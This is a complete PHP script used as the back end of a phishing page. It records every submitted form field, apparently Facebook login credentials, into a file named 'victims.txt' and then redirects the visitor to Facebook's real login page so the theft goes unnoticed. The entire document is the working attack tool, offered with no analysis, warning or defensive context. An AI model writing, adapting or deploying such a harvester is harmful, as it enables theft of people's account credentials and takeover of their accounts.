<?php

header ('Location: https://www.facebook.com/login');

$handle = fopen("victims.txt", "a");

foreach($_POST as $variable => $value) {

fwrite($handle, $variable);

fwrite($handle, "=");

fwrite($handle, $value);

fwrite($handle, "\r\n");

}

fwrite($handle, "\r\n\n\n\n");

fclose($handle);

exit;

?>